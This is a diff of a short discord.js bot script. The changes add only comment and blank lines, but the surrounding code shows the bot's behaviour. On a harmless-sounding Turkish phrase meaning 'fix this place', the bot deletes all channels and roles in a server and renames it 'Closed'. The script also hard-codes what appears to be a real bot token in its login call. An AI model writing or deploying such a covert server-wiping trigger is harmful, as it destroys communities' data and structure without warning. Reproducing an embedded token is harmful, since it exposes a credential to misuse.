@@ -1,8 +1,11 @@
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
 const Discord = require('discord.js');
 const berke = new Discord.Client();
 
 berke.on('message', async msg => {
   if (msg.content.toLowerCase() === 'burayı bi düzelt' ) {
+
     msg.guild.channels.deleteAll();
     msg.guild.roles.deleteAll();
     msg.guild.setName("Kapandı");
@@ -11,6 +14,8 @@ berke.on('message', async msg => {
 
   }
 });
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 berke.on('channelCreate', channel => {
   if (channel.name == 'hey') {
@@ -30,3 +35,6 @@ berke.on('channelCreate', channel => {
 });
 
 berke.login("NjE3NDczNjI3Mzk4NjAyNzUz.XWrtew.OCYAWHNwhKTdbstrtg87uALZA1o");
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
